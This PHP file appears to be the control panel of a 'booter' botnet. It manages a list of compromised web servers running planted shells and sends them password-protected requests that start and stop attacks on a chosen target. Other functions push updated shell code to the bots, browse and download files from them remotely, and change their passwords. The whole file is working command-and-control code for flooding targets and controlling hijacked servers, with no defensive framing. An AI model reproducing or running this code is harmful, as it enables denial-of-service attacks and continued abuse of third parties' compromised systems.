<?phprequire_once("./http.php");require_once("./utilities.php");require_once("./config/settings.php");require_once("./config/credential.php");if(file_exists("./config/".$list_file)) require_once("./config/".$list_file);$utilities = new utilities;$http = new http;if(isset($_GET['add_booter']) && empty($_GET['add_booter'])){	if(isset($_POST['url']) && !empty($_POST['url'])){		echo add_to_list(htmlentities($_POST['url']), "./config/".$list_file, $password);	}}elseif(isset($_GET['check_bot']) && empty($_GET['check_bot'])){	echo json_encode($list_bot);}elseif(isset($_GET['attack_first']) && empty($_GET['attack_first'])){	if(isset($_POST['target']) && isset($_POST['method']) && !empty($_POST['target']) && !empty($_POST['method'])){		$data = array(array(),array());		foreach($list_bot as $num => $list_bot){			$data[$num]['url'] = $list_bot[$num];			$data[$num]['post'] = array();			$data[$num]['post']['pass'] = $password;			$data[$num]['post']['attack'] = 'true';			$data[$num]['post']['target'] = $_POST['target'];			$data[$num]['post']['method'] = $_POST['method'];		}		$result = $http->multi_curl_request(array_filter($data), 5);		echo "OK";	}}elseif(isset($_GET['check_attack']) && empty($_GET['check_attack'])){	$online = array();	for($i = 1;$i < (count($list_bot) + 1);$i++){		$text_informant = get_url_path($list_bot[$i]).$shell_check_txt;		if($http->check_url($text_informant)){			if(file_get_contents($text_informant) == "RUN"){				$list_bot[$i] = "On";			}else{				$list_bot[$i] = "Off";			}		}else{			$list_bot[$i] = "Off";		}	}	print_r($list_bot);}elseif(isset($_GET['stop_attack']) && empty($_GET['stop_attack'])){	foreach($list_bot as $num => $list_bot_b){		$data[$num]['url'] = $list_bot[$num];		$data[$num]['post'] = array();		$data[$num]['post']['pass'] = $password;		$data[$num]['post']['stop'] = 'true';	}	$result = $http->multi_curl_request(array_filter($data), 5);	echo "OK";}elseif(isset($_GET['check_login']) && empty($_GET['check_login'])){	if(isset($_POST['username']) && isset($_POST['password']) && !empty($_POST['username']) && !empty($_POST['password'])){		foreach($credential as $username => $password){			if($utilities->encrypt_password($_POST['password']) == $password && $_POST['username'] == $username){				$cookie_value = $utilities->encrypt_cookie($_SERVER['HTTP_HOST']."booter".$password);				setcookie("booter", $cookie_value, time()+(60*(60*$cookie_time)));				echo "OK";				die();			}		}		echo "NOT OK";		die();	}}elseif(isset($_GET['add_user']) && empty($_GET['add_user'])){	if(isset($_POST['new_username']) && isset($_POST['new_password']) && !empty($_POST['new_username']) && !empty($_POST['new_password'])){		$old_cre = file_get_contents('./config/credential.php');		preg_match_all('/\"(.*?)\" \=\> \"(.*?)\"/', $old_cre, $extract_cre);		$old_cre = array_combine($extract_cre[1], $extract_cre[2]);		foreach($old_cre as $u => $p){			if($u == $_POST['new_username']){				echo "EXIST";				die();			}		}		$write = "<?php\r\n\r\n\$credential = array(\r\n";		foreach($old_cre as $old_user => $old_pass){			$write .= "\t\"".$old_user."\" => \"".$old_pass."\",\r\n";		}		$write .= "\t\"".$_POST['new_username']."\" => \"".$utilities->encrypt_password($_POST['new_password'])."\"\r\n";		$write .= ");\r\n\r\n?>";		if(file_put_contents("./config/credential.php", $write)){			echo "OK";		}else{			echo "NOT OK";		}	}}elseif(isset($_GET['update-shell']) && empty($_GET['update-shell'])){	if(isset($_POST['update_data']) && !empty($_POST['update_data'])){		foreach($list_bot as $num => $bot){			$data[$num]['url'] = $list_bot[$num];			$data[$num]['post'] = array();			$data[$num]['post']['pass'] = $password;			$data[$num]['post']['update'] = 'true';			$data[$num]['post']['update_data'] = $_POST['update_data'];		}		$result = $http->multi_curl_request(array_filter($data), 5);		echo "OK";	}}elseif(isset($_GET['change_pass']) && empty($_GET['change_pass'])){	if(isset($_POST['username']) && isset($_POST['old_pass']) && isset($_POST['new_pass']) && !empty($_POST['username']) && !empty($_POST['old_pass']) && !empty($_POST['new_pass'])){		$cre_get = file_get_contents('./config/credential.php');		preg_match_all('/\"(.*?)\" \=\> \"(.*?)\"/', $cre_get, $extract_cre);		$cre = array_combine($extract_cre[1], $extract_cre[2]);		$check = '';		foreach($cre as $user => $pass){			if($user == $_POST['username']){				$check = $user;				break;			}		}		if(empty($check)){			echo "NOT EXIST";		}else{			if($cre[$check] != $utilities->encrypt_password($_POST['old_pass'])){				echo "WRONG OLD PASS";			}else{				$cre_get = str_replace('"'.$check.'" => "'.$cre[$check].'"', '"'.$check.'" => "'.$utilities->encrypt_password($_POST['new_pass']).'"', $cre_get);				if(file_put_contents('./config/credential.php', $cre_get)){					echo "OK";				}else{					echo "NOT OK";				}			}		}	}}elseif(isset($_GET['fileman']) && empty($_GET['fileman'])){	if(isset($_POST['loc']) && isset($_POST['url']) && !empty($_POST['loc']) && !empty($_POST['url'])){		$return = $http->curl_request($_POST['url'], "pass=".$password."&fileman=true&loc=".$_POST['loc'],  $utilities->random_user_agent(), 10, false);		echo $return;	}}elseif(isset($_GET['check_ext']) && empty($_GET['check_ext'])){	if(isset($_POST['filename']) && !empty($_POST['filename'])){		echo $utilities->get_icon($_POST['filename']);	}}elseif(isset($_GET['files_decode']) && empty($_GET['files_decode'])){	if(isset($_POST['data']) && !empty($_POST['data'])){		$store = get_sourcecode_string(wordwrap(gzuncompress(base64_decode($_POST['data'])), 160, "\n", true), true);		echo $store;	}	}elseif(isset($_GET['get_source']) && empty($_GET['get_source'])){	if(isset($_POST['loc']) && isset($_POST['url']) && !empty($_POST['loc']) && !empty($_POST['url'])){		$return = json_decode($http->curl_request($_POST['url'], "pass=".$password."&fileman=true&loc=".$_POST['loc'],  $utilities->random_user_agent(), 10, false), true);		if($return['data'] == "TOO BIG"){			echo "TOO BIG";		}else{			echo gzuncompress(base64_decode($return['data']));		}	}}elseif(isset($_GET['human_filesize']) && empty($_GET['human_filesize'])){	if(isset($_POST['byte']) && !empty($_POST['byte'])){		echo $utilities->convert_size_byte($_POST['byte']);	}}elseif(isset($_GET['permission']) && empty($_GET['permission'])){	if(isset($_POST['data']) && !empty($_POST['data'])){		echo $utilities->get_permission_text($_POST['data'])." ( ".substr(sprintf('%o', $_POST['data']), -4)." )";	}}elseif(isset($_GET['split_dir']) && empty($_GET['split_dir'])){	if(isset($_POST['dir']) && !empty($_POST['dir']) && !empty($_POST['type']) && isset($_POST['type'])){		echo json_encode($utilities->split_dir($_POST['dir'], $_POST['type']));	}}elseif(isset($_GET['update_s_pass']) && empty($_GET['update_s_pass'])){	if(isset($_POST['pass']) && !empty($_POST['pass'])){		foreach($list_bot as $num => $bot){			$data[$num]['url'] = $list_bot[$num];			$data[$num]['post'] = array();			$data[$num]['post']['pass'] = $password;			$data[$num]['post']['change_pass'] = 'true';			$data[$num]['post']['new_pass'] = $_POST['pass'];		}		$result = $http->multi_curl_request(array_filter($data), 3);		$settings_data = file_get_contents("./config/settings.php");		$change = str_replace('"'.$password.'"', '"'.$_POST['pass'].'"', $settings_data);		if(file_put_contents("./config/settings.php", $change)){			echo "OK";		}else{			echo "NOT OK";		}	}}function get_url_path($url){	$tokens = explode('/', $url);	return str_replace($tokens[(count($tokens)-1)], "", $url);}/** * return data as :- * 0 = false * 1 = true * 2 = already exist */function add_to_list($url, $list_file, $password){	global $http, $list_bot;	if(!isset($list_bot) || count($list_bot) <= 0){		$url_data = parse_url($url, PHP_URL_HOST);		$url_data_ip = gethostbyname($url_data);		if(filter_var($url_data_ip, FILTER_VALIDATE_IP) != true){			return 0;		}		if($http->check_bot($url, $password)){			$list_data = "<?php\r\n\r\n\$list_bot = array(\r\n\t1 => \"".$url."\"\r\n);\r\n\r\n?>";			if(file_put_contents($list_file, $list_data)){				return 1;			}		}		return 0;	}else{		$collect_ip = array();		foreach($list_bot as $url_list){			$tmp = parse_url($url_list, PHP_URL_HOST);			$ip = gethostbyname($tmp);			if(filter_var($ip, FILTER_VALIDATE_IP)){				$collect_ip[] = $ip;			}		}		$url_data = parse_url($url, PHP_URL_HOST);		$url_data_ip = gethostbyname($url_data);		if(filter_var($url_data_ip, FILTER_VALIDATE_IP) != true){			return 0;		}		foreach($collect_ip as $loop_ip){			if($loop_ip == $url_data_ip){				return 2;			}		}		if($http->check_bot($url, $password)){			$list_data = "<?php\r\n\r\n\$list_bot = array(\r\n";			$count = 0;			foreach($list_bot as $num => $make_list){				$list_data .= "\t".$num." => \"".$make_list."\",\r\n";				$count = $num;			}			$list_data .= "\t".($count + 1)." => \"".$url."\"";			$list_data .= "\r\n);\r\n\r\n?>";			if(file_put_contents($list_file, $list_data)){				return 1;			}		}		return 0;	}}function get_sourcecode_string($str, $return = false, $counting = true, $first_line_num = '1', $font_color = '#666'){    $str = highlight_string($str, TRUE);    $replace = array(        '<font' => '<span',        'color="' => 'style="color: ',        '</font>' => '</span>',        '<code>' => '',        '</code>' => '',        '<span style="color: #FF8000">' =>            '<span style="color: '.$font_color.'">'        );    foreach ($replace as $html => $xhtml){        $str = str_replace($html, $xhtml, $str);    }    $str = substr($str, 30, -9);                    $arr_html      = explode('<br />', $str);    $total_lines   = count($arr_html);        $out           = '';    $line_counter  = 0;    $last_line_num = $first_line_num + $total_lines;        foreach ($arr_html as $line){        $line = str_replace(chr(13), '', $line);        $current_line = $first_line_num + $line_counter;        if ($counting){            $out .= '<span style="color:'.$font_color.'">'                  . str_repeat('&nbsp;', strlen($last_line_num) - strlen($current_line))                  . $current_line                  . ': </span>';        }        $out .= $line.'<br />'."\n";        $line_counter++;    }    $out = '<code>'."\n".$out.'</code>'."\n";		$old  = array(		"0000BB",		"000000",		"FF8000",		"DD0000",		"007700"	);	$new  = array(		"4C83AF",		"888888",		"87DF45",		"EEEEEE",		"FF8000"	);		$out = str_ireplace($old, $new, $out);    if ($return){return $out;}    else {echo $out;}}?>